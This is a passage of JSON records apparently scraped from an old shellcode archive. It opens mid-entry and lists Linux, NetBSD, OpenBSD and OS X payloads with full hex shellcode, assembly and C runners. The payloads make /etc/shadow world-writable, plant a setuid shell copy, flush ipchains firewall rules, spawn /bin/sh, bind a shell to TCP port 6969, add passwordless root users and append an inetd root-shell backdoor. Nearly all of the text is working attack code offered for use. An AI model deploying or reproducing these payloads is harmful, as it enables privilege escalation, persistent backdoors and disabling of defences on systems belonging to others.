[2004-09-26]"]},
{"Title": "Linux/x86 - chmod 666 /etc/shadow Shellcode (41 bytes)", "Author": "Matias Sedalo", "Published": ": 2004-09-26", "Platform": "Linux_x86", "Download": "http://shell-storm.org/shellcode/files/shellcode-355.php", "View": null, "code": ["/*", " * s0t4ipv6@shellcode.com.ar", " * 0x04abril0x7d2", " * ", " * int sys_chmod(const char * filename, mode_t mode)", " * {...}", " * ", " * Utilizando la interrupcion 15(chmod), asignando el octal 0666", " * al archivo deseado. En este caso /etc/shadow", " * ", " * Hice unas modificaciones en el codigo y solo pude reducir la shellcode en 1.", " * por el codigo mailme.", " *\t\"\\x31\\xdb\\x68\\x64\\x6f\\x77\\x53\\x68\\x2f\\x73\\x68\\x61\\x68\\x2f\\x65\"", " *\t\"\\x74\\x63\\x89\\xe3\\x31\\xc9\\x88\\x4c\\x24\\x0b\\x66\\xb9\\xb6\\x01\\x31\"", " *\t\"\\xc0\\xb0\\x0f\\xcd\\x80\\x31\\xc0\\x40\\xcd\\x80\";", " *", "*/", "", "#include <stdio.h>", "", "// Shellcode\t\t\t//\tAsm Code\t\t// Main Interval", "char shellcode[]=", "\"\\xeb\\x17\"\t\t\t//\tjmp     0x17\t\t[3 ; 4]", "\"\\x5e\"\t\t\t\t//\tpopl    %esia\t\t[5]", "\"\\x31\\xc9\"\t\t\t//\txorl    %ecx, %ecx\t[6 ; 7]", "\"\\x88\\x4e\\x0b\"\t\t\t//      movb    %ecx, 0xb(%esi)\t[8; 10]", "\"\\x8d\\x1e\"\t\t\t//\tleal    (%esi), %ebx\t[11;12]", "\"\\x66\\xb9\\xb6\\x01\"\t\t//\tmovw    $0x1b6, %cx     // asigno a cx el equivalente en hex al octal 0666", "\"\\x31\\xc0\"\t\t\t//\txorl    %eax, %eax\t[17;18]", "\"\\xb0\\x0f\"\t\t\t//      movb    $0xf, %al       // Interrupcion 15 (chmod)", "\"\\xcd\\x80\"\t\t\t//      int     $0x80\t\t[21;22]", "\"\\x31\\xc0\"\t\t\t//\txorl    %eax, %eax      // salida", "\"\\x40\"\t\t\t\t//\tinc     %eax\t\t[25]", "\"\\xcd\\x80\"\t\t\t//      int     $0x80\t\t[26;27]", "\"\\xe8\\xe4\\xff\\xff\\xff\"\t\t//      call    -0x1c", "\"/etc/shadow\";", "", "main() {", "\tint *ret;", "\tret=(int *)&ret+2;", "\tprintf(\"Shellcode lenght=%d\\n\",strlen(shellcode));", "\t(*ret) = (int)shellcode;", "}", "", "// milw0rm.com [2004-09-26]"]},
{"Title": "Linux/x86 - cp /bin/sh /tmp/katy + chmod 4555 katy Shellcode (126 bytes)", "Author": "RaiSe", "Published": ": 2004-09-26", "Platform": "Linux_x86", "Download": "http://shell-storm.org/shellcode/files/shellcode-51.php", "View": null, "code": ["/*", " *  Linux/x86", " *", " *  /bin/cp /bin/sh /tmp/katy ; chmod 4555 /tmp/sh using fork()", " */", "#include <stdio.h>", "", "", "char shellcode[] =", "\"\\xeb\\x5e\\x5f\\x31\\xc0\\x88\\x47\\x07\\x88\\x47\\x0f\\x88\\x47\\x19\\x89\\x7f\"", "\"\\x1a\\x8d\\x77\\x08\\x89\\x77\\x1e\\x31\\xf6\\x8d\\x77\\x10\\x89\\x77\\x22\\x89\"", "\"\\x47\\x26\\x89\\xfb\\x8d\\x4f\\x1a\\x8d\\x57\\x26\\x31\\xc0\\xb0\\x02\\xcd\\x80\"", "\"\\x31\\xf6\\x39\\xc6\\x75\\x06\\xb0\\x0b\\xcd\\x80\\xeb\\x1d\\x31\\xd2\\x31\\xc0\"", "\"\\x31\\xdb\\x4b\\x8d\\x4f\\x26\\xb0\\x07\\xcd\\x80\\x31\\xc0\\x8d\\x5f\\x10\\x31\"", "\"\\xc9\\x66\\xb9\\x6d\\x09\\xb0\\x0f\\xcd\\x80\\x31\\xc0\\x40\\x31\\xdb\\xcd\\x80\"", "\"\\xe8\\x9d\\xff\\xff\\xff/bin/cp8/bin/sh8/tmp/katy\";", "", "main() {", "        int *ret;", "        ret=(int *)&ret +2;", "        printf(\"Shellcode lenght=%d\\n\",strlen(shellcode));", "        (*ret) = (int)shellcode;", "}", "", "/* Code */", "/*", "__asm__(\"", "        jmp    0x5e", "        popl   %edi", "        xorl   %eax,%eax", "        movb   %al,0x7(%edi)", "        movb   %al,0xf(%edi)", "        movb   %al,0x19(%edi)", "        movl   %edi,0x1a(%edi)", "        leal   0x8(%edi),%esi", "        movl   %esi,0x1e(%edi)", "        xorl   %esi,%esi", "        leal   0x10(%edi),%esi", "        movl   %esi,0x22(%edi)", "        movl   %eax,0x26(%edi)", "        movl   %edi,%ebx", "        leal   0x1a(%edi),%ecx", "        leal   0x26(%edi),%edx", "        xorl   %eax,%eax", "        movb   $0x2,%al", "        int    $0x80", "        xorl   %esi,%esi", "        cmpl   %eax,%esi", "        jne    0x6", "        movb   $0xb,%al", "        int    $0x80", "        jmp    0x1d", "        xorl   %edx,%edx", "        xorl   %eax,%eax", "        xorl   %ebx,%ebx", "        dec    %ebx", "        leal   0x26(%edi),%ecx", "        movb   $0x7,%al", "        int    $0x80", "        xorl   %eax,%eax", "        leal   0x10(%edi),%ebx", "        xorl   %ecx,%ecx", "        movw   $0x96d,%cx", "        movb   $0xf,%al", "        int    $0x80", "        xorl   %eax,%eax", "        inc    %eax", "        xorl   %ebx,%ebx", "        int    $0x80", "        call   -0x63", "        .ascii \\\"/bin/cp8/bin/sh8/tmp/katy\\\"", "\");", "*/", "", "/*", "RaiSe <raise@undersec.com>", "http://www.undersec.com", "*/", "", "// milw0rm.com [2004-09-26]"]},
{"Title": "Linux/x86 - Eject /dev/cdrom Shellcode (64 bytes)", "Author": "lamagra", "Published": ": 2004-09-26", "Platform": "Linux_x86", "Download": "https://old.exploit-db.com/download/13439.c", "View": "https://old.exploit-db.com/raw/13439/", "code": ["/*", "        CDROM EJECTING CODE by lamagra", "", ".data", ".globl main", "        .type    main,@function", "_start:", "        # setreuid (0, 0)", "        xorl %eax,%eax", "        xorl %ebx,%ebx", "        xorl %ecx,%ecx", "        xorl %edx,%edx", "        movb $70,%al", "        int  $0x80", "", "        jmp 0x21", "        popl %esi", "        movb %edx,10(%esi)", "        leal (%esi), %ebx", "        # open(\"/dev/cdrom\", O_RDONLY|O_NONBLOCK|0x4, 666)", "        movb $5, %al", "        movw $0x804, %cx", "        movw $666, %dx", "        int $0x80", "", "        movl %eax, %ebx", "", "        # ioctl(%eax, 0x5309, 0)", "        movb $54, %al", "        movw $21257, %cx", "", "        int $0x80", "", "        # exit(0)", "        xorl %eax, %eax", "        xorl %ebx, %ebx", "        inc %eax", "        int $0x80", "        call -0x26", "\t.string \"/dev/cdrom\"", "*/", "#include <stdio.h>", "", "char eject[] = ", "\"\\x31\\xc0\\x31\\xdb\\x31\\xc9\\x31\\xd2\\xb0\\x46\\xcd\\x80\\xeb\\x23\\x5e\\x88\\x56\\x0a\\x8d\"", "\"\\x1e\\xb0\\x05\\x66\\xb9\\x04\\x08\\x66\\xba\\x9a\\x02\\xcd\\x80\\x89\\xc3\\xb0\\x36\\x66\\xb9\"", "\"\\x09\\x53\\xcd\\x80\\x31\\xc0\\x31\\xdb\\x40\\xcd\\x80\\xe8\\xd8\\xff\\xff\\xff/dev/cdrom\";", "", "main() {", "        int *ret;", "        ret=(int *)&ret +2;", "        printf(\"Shellcode lenght=%d\\n\",strlen(eject));", "        (*ret) = (int)eject;", "}", "", "// milw0rm.com [2004-09-26]"]},
{"Title": "Linux/x86 - xterm -ut -display 1270.0.0.1:0 Shellcode (132 bytes)", "Author": "RaiSe", "Published": ": 2004-09-26", "Platform": "Linux_x86", "Download": "https://old.exploit-db.com/download/13440.c", "View": "https://old.exploit-db.com/raw/13440/", "code": ["/*", " *  Linux/x86", " *  ", " *  execve() of /usr/X11R6/bin/xterm -ut -display ip:0, exit()", " *  127.0.0.1 is an example, you must change it to a useful ip ", " *  (making a subrutine into the exploit?)", " *  - you must not delete 'K' after ip:0 -", " */", "#include <stdio.h>", "", "char shellcode[] =", "\"\\xeb\\x4f\\x5e\\x31\\xd2\\x88\\x56\\x14\\x88\\x56\\x18\\x88\\x56\\x21\\xb2\\x2b\"", "\"\\x31\\xc9\\xb1\\x09\\x80\\x3c\\x32\\x4b\\x74\\x05\\x42\\xe2\\xf7\\xeb\\x2b\\x88\"", "\"\\x34\\x32\\x31\\xd2\\x89\\xf3\\x89\\x76\\x36\\x8d\\x7e\\x15\\x89\\x7e\\x3a\\x8d\"", "\"\\x7e\\x19\\x89\\x7e\\x3e\\x8d\\x7e\\x22\\x89\\x7e\\x42\\x89\\x56\\x46\\x8d\\x4e\"", "\"\\x36\\x8d\\x56\\x46\\x31\\xc0\\xb0\\x0b\\xcd\\x80\\x31\\xdb\\x89\\xd8\\x40\\xcd\"", "\"\\x80\\xe8\\xac\\xff\\xff\\xff\"", "\"/usr/X11R6/bin/xterm8-ut8-display8127.0.0.1:0K\";", "", "main() {", "        int *ret;", "        ret=(int *)&ret+2;", "        printf(\"Shellcode lenght=%d\\n\",strlen(shellcode));", "        (*ret) = (int)shellcode;", "}", "", "/* Code */", "/* ", "__asm__(\"", "jmp    0x4f", "popl   %esi", "xorl   %edx,%edx", "movb   %dl,0x14(%esi)", "movb   %dl,0x18(%esi)", "movb   %dl,0x21(%esi)", "movb   $0x2b,%dl", "xorl   %ecx,%ecx", "movb   $0x9,%cl", "cmpb   $0x4b,(%edx,%esi)", "je     0x5", "inc    %edx", "loop   -0x9", "jmp    0x2b", "movb   %dh,(%edx,%esi)", "xorl   %edx,%edx", "movl   %esi,%ebx", "movl   %esi,0x36(%esi)", "leal   0x15(%esi),%edi", "movl   %edi,0x3a(%esi)", "leal   0x19(%esi),%edi", "movl   %edi,0x3e(%esi)", "leal   0x22(%esi),%edi", "movl   %edi,0x42(%esi)", "movl   %edx,0x46(%esi)", "leal   0x36(%esi),%ecx", "leal   0x46(%esi),%edx", "xorl   %eax,%eax", "movb   $0xb,%eax", "int    $0x80", "xorl   %ebx,%ebx", "movl   %ebx,%eax", "inc    %eax", "int    $0x80", "call   -0x54", ".string \\\"/usr/X11R6/bin/xterm8-ut8-display8127.0.0.1:0K\\\"", "\");", "*/", "", "/*", "RaiSe <raise@undersec.com>", "http://www.undersec.com", "*/", "", "// milw0rm.com [2004-09-26]"]},
{"Title": "Linux/x86 - Flush IPChains Rules (/sbin/ipchains -F) Shellcode (49 bytes)", "Author": "Sp4rK", "Published": ": 2004-09-26", "Platform": "Linux_x86", "Download": "http://shell-storm.org/shellcode/files/shellcode-365.php", "View": null, "code": ["#include <stdio.h>", "#include <string.h>", "", "/* ", "__asm__(\"", "", "sub     $0x4,%esp   ## Con esto conseguimos que la shellcode nunca se", "popl    %esp        ## sobreescriba... gracias RaiSe :)", "", "xorl    %edx,%edx   ## %edx a cero", "pushl   %edx        ## y ponemos los zeros del final del string en memoria", "pushw   $0x462d     ## tenemos -F0000", "", "movl    %esp,%esi   ## wardamos argv[1] en %esi", "", "pushl   %edx        ## 0000-F0000", "", "pushl   $0x736e6961", "pushl   $0x68637069 ## ipchains0000-F0000", "", "movl    %esp,%edi   ## wardamos argv[0] en %edi", "", "pushl   $0x2f6e6962", "pushl   $0x732f2f2f ## ///sbin/ipchains0000-F0000", "", "movl    %esp,%ebx   ## en %ebx, el nombre de archivo", "", "pushl   %edx        ## 0000///sbin/ipchains0000-F0000", "pushl   %esi        ## A[1]0000///sbin/ipchains0000-F0000", "pushl   %edi        ## A[0]A[1]0000///sbin/ipchains0000-F0000", "", "movl    %esp,%ecx   ## %ecx apunta a el inicio del argv[]", "", "xorl    %eax,%eax", "movb    $0xb,%al", "int     $0x80", "", "\");", "*/", "", "char c0de[]=", "\"\\x83\\xec\\x04\\x5c\\x31\\xd2\\x52\\x66\\x68\\x2d\\x46\\x89\\xe6\\x52\\x68\\x61\\x69\\x6e\\x73\"", "\"\\x68\\x69\\x70\\x63\\x68\\x89\\xe7\\x68\\x62\\x69\\x6e\\x2f\\x68\\x2f\\x2f\\x2f\\x73\\x89\\xe3\"", "\"\\x52\\x56\\x57\\x89\\xe1\\x31\\xc0\\xb0\\x0b\\xcd\\x80\";", "", "", "/* execve(\"///sbin/ipchains\",ARGV,NULL);", " * ARGV[] = {\"ipchains\",\"-F\",NULL}", " */", "", "int main(void)", "{", "\tlong *toRET;", "\tchar vuln[52];", "", "\t*(&toRET+2) = (long *)c0de;", "", "\tstrcpy(vuln, c0de);", "", "\tprintf(\"Shellc0de length: %d\\nRunning.......\\n\\n\", strlen(c0de));", "\treturn(0);", "}", "", "/* Sp4rK <sp4rk@netsearch-ezine.com>", " * UNDERSEC Security TEAM", " * NetSearch E-zine", " */", "", "// milw0rm.com [2004-09-26]"]},
{"Title": "Linux/x86 - chmod 666 /etc/shadow Shellcode (82 bytes)", "Author": "Matias Sedalo", "Published": ": 2004-09-26", "Platform": "Linux_x86", "Download": "https://old.exploit-db.com/download/13442.c", "View": "https://old.exploit-db.com/raw/13442/", "code": ["/* ", " * s0t4ipv6@Shellcode.com.ar", " * ", " * Usando execve() y un array de punteros", " * ", " *  #include <stdio.h>", " *  main() {", " *       char *name[4];", " *       name[0]=\"/bin/chmod\";", " *       name[1]=\"666\";", " *       name[2]=\"/etc/shadow\";", " *       name[3]=NULL;", " *       execve(name[0],name,NULL);", " *  }", " */", "", "#include <stdio.h>", "", "char shellcode[]=", "\"\\xeb\\x31\"\t\t//\tjmp\t0x31\t\t\t// 3-4", "\"\\x5e\"\t\t\t//\tpopl\t%esi\t\t\t// 5", "\"\\x31\\xc0\"\t\t//\txorl\t%eax, %eax\t\t// 6-7", "\"\\x88\\x46\\x0a\"\t\t//\tmovb\t%al, 0xa(%esi)\t\t// 8-10", "\"\\x88\\x46\\x0e\"\t\t//\tmovb\t%al, 0xe(%esi)\t\t// 11-13", "\"\\x88\\x46\\x1a\"\t\t//\tmovb\t%al, 0x1a(%esi)\t\t// 14-16", "\"\\x89\\x76\\x1b\"\t\t//\tmovl\t%esi, 0x1b(%esi)\t// 17-19", "\"\\x8d\\x7e\\x0b\"\t\t//\tleal\t0xb(%esi), %edi\t\t// 20-22", "\"\\x89\\x7e\\x1f\"\t\t//\tmovl\t%edi, 0x1f(%esi)\t// 23-25", "\"\\x8d\\x7e\\x0f\"\t\t//\tleal\t0xf(%esi), %edi\t\t// 26-28", "\"\\x89\\x7e\\x23\"\t\t//\tmovl\t%edi, 0x23(%esi)\t// 29-31", "\"\\x89\\x46\\x27\"\t\t//\tmovl\t%eax 0x27(%esi)\t\t// 32-34", "\"\\xb0\\x0b\"\t\t//\tmovb\t$0xb, %al\t\t// 35-36 0xb to eax (syscall execve)", "\"\\x89\\xf3\"\t\t//\tmovl\t%esi, %ebx\t\t// 37-38 name[0] to ebx", "\"\\x8d\\x4e\\x1b\"\t\t//\tleal    0x1b(%esi),%ecx\t\t// 39-41", "\"\\x8d\\x56\\x27\"\t\t//\tleal    0x27(%esi),%edx\t\t// 42-44", "\"\\xcd\\x80\"\t\t//\tint\t$0x80\t\t\t// 45-46", "\"\\x31\\xc0\"\t\t//\txorl\t%eax, %eax\t\t// 47-48", "\"\\x31\\xdb\"\t\t//\txorl    %ebx, %ebx\t\t// 49-50", "\"\\x40\"\t\t\t//\tinc\t%eax\t\t\t// 51", "\"\\xcd\\x80\"\t\t//\tint\t$0x80\t\t\t// 52-53", "\"\\xe8\\xca\\xff\\xff\\xff\"\t//\tcall\t-0x36", "\"/bin/chmod06660/etc/shadow\";", "", "main() {", "        int *ret;", "        ret=(int *)&ret +2;", "        printf(\"Shellcode lenght=%d\\n\",strlen(shellcode));", "        (*ret) = (int)shellcode;", "}", "", "// milw0rm.com [2004-09-26]"]},
{"Title": "NetBSD/x86 - execve(/bin/sh) Shellcode (68 bytes)", "Author": "humble", "Published": ": 2004-09-26", "Platform": "NetBSD_x86", "Download": "http://shell-storm.org/shellcode/files/shellcode-108.php", "View": null, "code": ["/*", " *  NetBSD", " *  execve() of /bin/sh by humble of Rhino9", " */", "", "char shellcode[] =", "  \"\\xeb\\x23\"", "  \"\\x5e\"", "  \"\\x8d\\x1e\"", "  \"\\x89\\x5e\\x0b\"", "  \"\\x31\\xd2\"", "  \"\\x89\\x56\\x07\"", "  \"\\x89\\x56\\x0f\"", "  \"\\x89\\x56\\x14\"", "  \"\\x88\\x56\\x19\"", "  \"\\x31\\xc0\"", "  \"\\xb0\\x3b\"", "  \"\\x8d\\x4e\\x0b\"", "  \"\\x89\\xca\"", "  \"\\x52\"", "  \"\\x51\"", "  \"\\x53\"", "  \"\\x50\"", "  \"\\xeb\\x18\"", "  \"\\xe8\\xd8\\xff\\xff\\xff\"", "  \"/bin/sh\"", "  \"\\x01\\x01\\x01\\x01\"", "  \"\\x02\\x02\\x02\\x02\"", "  \"\\x03\\x03\\x03\\x03\"", "  \"\\x9a\\x04\\x04\\x04\\x04\\x07\\x04\";", "", "# milw0rm.com [2004-09-26]"]},
{"Title": "OpenBSD/x86 - Bind (6969/TCP) Shell Shellcode (148 bytes)", "Author": "Sinan Eren", "Published": ": 2004-09-26", "Platform": "OpenBSD_x86", "Download": "http://shell-storm.org/shellcode/files/shellcode-164.php", "View": null, "code": ["/*", " shell on port 6969/tcp shellcode for OpenBSD by noir", " */", "", "#include <stdio.h>", "long shellcode[]=", "{", "  0x4151c931,0x51514151,0x61b0c031,0x078980cd,", "  0x4f88c931,0x0547c604,0x084f8902,0x0647c766,", "  0x106a391b,0x5004478d,0x5050078b,0x68b0c031,", "  0x016a80cd,0x5050078b,0x6ab0c031,0xc93180cd,", "  0x078b5151,0xc0315050,0x80cd1eb0,0xc9310789,", "  0x50078b51,0xb0c03150,0x4180cd5a,0x7503f983,", "  0x5b23ebef,0xc9311f89,0x89074b88,0x8d51044f,", "  0x078b5007,0xc0315050,0x80cd3bb0,0x5151c931,", "  0x01b0c031,0xd8e880cd,0x2fffffff,0x2f6e6962,", "  0x90416873", "};", "", "int", "main(void)", "{", "  void (*f) (void);", "", "  f =(void *) shellcode;", "  //printf(\"shellcode len: %d\\n\", strlen(shellcode));", "", "  f();", "}", "", "// milw0rm.com [2004-09-26]"]},
{"Title": "OpenBSD/x86 - Add Root User (w00w00) Shellcode (112 bytes)", "Author": "anonymous", "Published": ": 2004-09-26", "Platform": "OpenBSD_x86", "Download": "http://shell-storm.org/shellcode/files/shellcode-165.php", "View": null, "code": ["#include <string.h>", "", "char shell[]=", "\"\\xeb\\x2b\\x5e\\x31\\xc0\\x88\\x46\\x0b\"", "\"\\x88\\x46\\x29\\x50\\xb0\\x09\\x50\\x31\"", "\"\\xc0\\x56\\x50\\xb0\\x05\\xcd\\x80\\x89\"", "\"\\xc3\\x6a\\x1d\\x8d\\x46\\x0c\\x50\\x53\"", "\"\\x50\\x31\\xc0\\xb0\\x04\\xcd\\x80\\x31\"", "\"\\xc0\\xb0\\x01\\xcd\\x80\\xe8\\xd0\\xff\"", "\"\\xff\\xff\\x2f\\x74\\x6d\\x70\\x2f\\x70\"", "\"\\x61\\x73\\x73\\x77\\x64\\x30\\x77\\x30\"", "\"\\x30\\x77\\x30\\x30\\x3a\\x3a\\x30\\x3a\"", "\"\\x30\\x3a\\x77\\x30\\x30\\x77\\x30\\x30\"", "\"\\x3a\\x2f\\x3a\\x2f\\x62\\x69\\x6e\\x2f\"", "\"\\x73\\x68\\x0a\\x30\\xff\\xff\\xff\\xff\"", "\"\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\"", "\"\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\";", "", "main()", "{", "   int *ret;", "   printf(\"\\n%d\\n\",sizeof(shell));", "   ret=(int*)&ret+2;", "   (*ret)=(int)shell;", "}", "", "// milw0rm.com [2004-09-26]"]},
{"Title": "OSX/PPC - Add Root User (r00t) Shellcode (219 bytes)", "Author": "B-r00t", "Published": ": 2004-09-26", "Platform": "OSX_PPC", "Download": "http://shell-storm.org/shellcode/files/shellcode-128.php", "View": null, "code": ["/* ", "PPC OS X / Darwin Shellcode by B-r00t. 2003.", "open(); write(); close(); execve(); exit();", "See ASM below.", "219 Bytes!", "*/", "", "char shellcode[] =", "\"\\x7c\\xa5\\x2a\\x79\\x40\\x82\\xff\\xfd\\x7d\\x48\\x02\\xa6\\x3b\\xea\\x01\\x70\"", "\"\\x39\\x60\\x01\\x70\\x39\\x1f\\xff\\x0d\\x7c\\xa8\\x29\\xae\\x38\\x7f\\xff\\x04\"", "\"\\x38\\x80\\x02\\x01\\x38\\xa0\\xff\\xff\\x38\\x0b\\xfe\\x95\\x44\\xff\\xff\\x02\"", "\"\\x60\\x60\\x60\\x60\\x38\\x9f\\xff\\x0e\\x38\\xab\\xfe\\xe5\\x38\\x0b\\xfe\\x94\"", "\"\\x44\\xff\\xff\\x02\\x60\\x60\\x60\\x60\\x38\\x0b\\xfe\\x96\\x44\\xff\\xff\\x02\"", "\"\\x60\\x60\\x60\\x60\\x7c\\xa5\\x2a\\x79\\x38\\x7f\\xff\\x04\\x90\\x61\\xff\\xf8\"", "\"\\x90\\xa1\\xff\\xfc\\x38\\x81\\xff\\xf8\\x38\\x0b\\xfe\\xcb\\x44\\xff\\xff\\x02\"", "\"\\x60\\x60\\x60\\x60\\x38\\x0b\\xfe\\x91\\x44\\xff\\xff\\x02\\x2f\\x74\\x6d\\x70\"", "\"\\x2f\\x78\\x2e\\x73\\x68\\x58\\x23\\x21\\x2f\\x62\\x69\\x6e\\x2f\\x73\\x68\\x0a\"", "\"\\x2f\\x62\\x69\\x6e\\x2f\\x65\\x63\\x68\\x6f\\x20\\x27\\x72\\x30\\x30\\x74\\x3a\"", "\"\\x3a\\x39\\x39\\x39\\x3a\\x38\\x30\\x3a\\x3a\\x30\\x3a\\x30\\x3a\\x72\\x30\\x30\"", "\"\\x74\\x3a\\x2f\\x3a\\x2f\\x62\\x69\\x6e\\x2f\\x73\\x68\\x27\\x20\\x7c\\x20\\x2f\"", "\"\\x75\\x73\\x72\\x2f\\x62\\x69\\x6e\\x2f\\x6e\\x69\\x6c\\x6f\\x61\\x64\\x20\\x2d\"", "\"\\x6d\\x20\\x70\\x61\\x73\\x73\\x77\\x64\\x20\\x2e\\x0a\";", "", "int main (void) ", "{", "        __asm__(\"b _shellcode\");", "}", "", "", "/*", "; PPC OS X / Darwin Shellcode by B-r00t. ", "; open(); write(); close(); execve(); exit()", "; Adds a user account (admin member) using a ", "; '/tmp/x.sh shellscript (niload).", "; echo 'r00t::999:80::0:0:r00t:/:/bin/sh' | /usr/bin/niload -m passwd . ", ";", ".globl _main", ".text", "_main:", "        xor.    r5, r5, r5", "        bnel    _main                    ", "        mflr    r10", "\taddi\tr31, r10, 368", "\tli\tr11, 368", "        addi    r8, r31, -243", "        stbx    r5, r8, r5", "        addi    r3, r31, -252", "        li      r4, 513", "        li      r5, -1  ", "        addi    r0,  r11, -363", "        .long   0x44ffff02", "        .long   0x60606060", "        addi    r4, r31, -242", "        addi    r5, r11, -283", "        addi    r0, r11, -364", "        .long   0x44ffff02", "        .long   0x60606060", "        addi    r0, r11, -362", "        .long   0x44ffff02      ", "        .long   0x60606060", "        xor.    r5, r5, r5", "        addi    r3, r31, -252          ", "        stw     r3, -8(r1)      ", "        stw     r5, -4(r1)      ", "        subi    r4, r1, 8       ", "        addi    r0, r11, -309             ", "        .long   0x44ffff02      ", "        .long   0x60606060", "        addi    r0, r11, -367", "        .long   0x44ffff02", "path:   .asciz  \"/tmp/x.shX#!/bin/sh\\n/bin/echo 'r00t::999:80::0:0:r00t:/:/bin/sh' | /usr/bin/niload -m passwd .\\n\"", "*/", "", "// milw0rm.com [2004-09-26]"]},
{"Title": "OSX/PPC - execve(/bin/sh) Shellcode (72 bytes)", "Author": "B-r00t", "Published": ": 2004-09-26", "Platform": "OSX_PPC", "Download": "https://old.exploit-db.com/download/13481.c", "View": "https://old.exploit-db.com/raw/13481/", "code": ["/*", "PPC OSX/Darwin Shellcode by B-r00t. 2003.", "Does execve(/bin/sh); exit(0);", "See ASM below.", "72 Bytes.", "*/", "", "char shellcode[] =", "\"\\x7c\\xa5\\x2a\\x79\\x40\\x82\\xff\\xfd\"", "\"\\x7d\\x68\\x02\\xa6\\x3b\\xeb\\x01\\x70\"", "\"\\x39\\x40\\x01\\x70\\x39\\x1f\\xfe\\xcf\"", "\"\\x7c\\xa8\\x29\\xae\\x38\\x7f\\xfe\\xc8\"", "\"\\x90\\x61\\xff\\xf8\\x90\\xa1\\xff\\xfc\"", "\"\\x38\\x81\\xff\\xf8\\x38\\x0a\\xfe\\xcb\"", "\"\\x44\\xff\\xff\\x02\\x7c\\xa3\\x2b\\x78\"", "\"\\x38\\x0a\\xfe\\x91\\x44\\xff\\xff\\x02\"", "\"\\x2f\\x62\\x69\\x6e\\x2f\\x73\\x68\\x58\";", "", "int main (void)", "{", "        __asm__(\"b _shellcode\");", "}", "", "", "/*", "; PPC OS X / Darwin Shellcode by B-r00t.", "; execve(/bin/sh) exit(0)", ";", ".globl _main", ".text", "_main:", "        xor.    r5, r5, r5", "        bnel    _main", "        mflr    r11", "        addi    r31, r11, 368", "        li      r10, 368", "        addi    r8, r31, -305", "        stbx    r5, r8, r5", "        addi    r3, r31, -312", "        stw     r3, -8(r1)", "        stw     r5, -4(r1)", "        subi    r4, r1, 8", "        addi    r0, r10, -309", "        .long   0x44ffff02", "        mr      r3, r5", "        addi    r0, r10, -367", "        .long   0x44ffff02", "path:   .asciz  \"/bin/shX\"", " ", "*/", "", "// milw0rm.com [2004-09-26]"]},
{"Title": "OSX/PPC - Add inetd (/etc/inetd.conf) Backdoor (Bind 6969/TCP Shell) Shellcode (222 bytes)", "Author": "B-r00t", "Published": ": 2004-09-26", "Platform": "OSX_PPC", "Download": "http://shell-storm.org/shellcode/files/shellcode-127.php", "View": null, "code": ["/*", "PPC OS X / Darwin Shellcode by B-r00t. 2003.", "open(); write(); close(); execve(); exit();", "See ASM below.", "222 Bytes!", "*/", "", "char shellcode[] =", "\"\\x7c\\xa5\\x2a\\x79\\x40\\x82\\xff\\xfd\\x7d\\x48\\x02\\xa6\\x3b\\xea\\x01\\x70\"", "\"\\x39\\x60\\x01\\x70\\x39\\x1f\\xff\\x1b\\x7c\\xa8\\x29\\xae\\x39\\x1f\\xff\\x65\"", "\"\\x7c\\xa8\\x29\\xae\\x38\\x7f\\xff\\x0c\\x38\\x8b\\xfe\\x99\\x38\\xa0\\xff\\xff\"", "\"\\x38\\x0b\\xfe\\x95\\x44\\xff\\xff\\x02\\x60\\x60\\x60\\x60\\x38\\x9f\\xff\\x1c\"", "\"\\x38\\xab\\xfe\\xca\\x38\\x0b\\xfe\\x94\\x44\\xff\\xff\\x02\\x60\\x60\\x60\\x60\"", "\"\\x38\\x0b\\xfe\\x96\\x44\\xff\\xff\\x02\\x60\\x60\\x60\\x60\\x7c\\xa5\\x2a\\x79\"", "\"\\x38\\x7f\\xff\\x56\\x90\\x61\\xff\\xf8\\x90\\xa1\\xff\\xfc\\x38\\x81\\xff\\xf8\"", "\"\\x38\\x0b\\xfe\\xcb\\x44\\xff\\xff\\x02\\x60\\x60\\x60\\x60\\x38\\x0b\\xfe\\x91\"", "\"\\x44\\xff\\xff\\x02\\x2f\\x65\\x74\\x63\\x2f\\x69\\x6e\\x65\\x74\\x64\\x2e\\x63\"", "\"\\x6f\\x6e\\x66\\x58\\x0a\\x61\\x63\\x6d\\x73\\x6f\\x64\\x61\\x20\\x73\\x74\\x72\"", "\"\\x65\\x61\\x6d\\x20\\x74\\x63\\x70\\x20\\x6e\\x6f\\x77\\x61\\x69\\x74\\x20\\x72\"", "\"\\x6f\\x6f\\x74\\x20\\x2f\\x75\\x73\\x72\\x2f\\x6c\\x69\\x62\\x65\\x78\\x65\\x63\"", "\"\\x2f\\x74\\x63\\x70\\x64\\x20\\x2f\\x62\\x69\\x6e\\x2f\\x73\\x68\\x0a\\x2f\\x75\"", "\"\\x73\\x72\\x2f\\x73\\x62\\x69\\x6e\\x2f\\x69\\x6e\\x65\\x74\\x64\\x58\";", "", "int main (void) ", "{", "        __asm__(\"b _shellcode\");", "}", "", "/*", "; PPC OS X / Darwin Shellcode by B-r00t. ", "; open(); write(); close(); execve(); exit()", "; Appends a backdoor (port 6969 rootshell) line into ", "; '/etc/inetd.conf' and executes '/usr/sbin/inetd'.", "; Commands MUST end with ';' ie. uname -a;", ";", ".globl _main", ".text", "_main:", "        xor.    r5, r5, r5", "        bnel    _main                    ", "        mflr    r10", "\taddi\tr31, r10, 368", "\tli      r11, 368", "        addi    r8, r31, -229 ", "        stbx    r5, r8, r5", "        addi    r8, r31, -155 ", "        stbx    r5, r8, r5", "        addi    r3, r31, -244", "\taddi    r4, r11, -359", "        li      r5, -1  ", "        addi    r0, r11, -363 ", "        .long   0x44ffff02", "        .long   0x60606060", "        addi    r4, r31, -228 ", "        addi    r5, r11, -310", "        addi    r0, r11, -364", "        .long   0x44ffff02", "        .long   0x60606060", "        addi    r0, r11, -362", "        .long   0x44ffff02      ", "        .long   0x60606060", "        xor.    r5, r5, r5", "        addi    r3, r31, -170          ", "        stw     r3, -8(r1)      ", "        stw     r5, -4(r1)      ", "        subi    r4, r1, 8       ", "        addi     r0, r11, -309             ", "        .long   0x44ffff02      ", "        .long   0x60606060", "        addi    r0, r11, -367", "        .long   0x44ffff02", "path:   .asciz  \"/etc/inetd.confX\\nacmsoda stream tcp nowait root /usr/libexec/tcpd /bin/sh\\n/usr/sbin/inetdX\"", "", "*/", "", "// milw0rm.com [2004-09-26]"]},
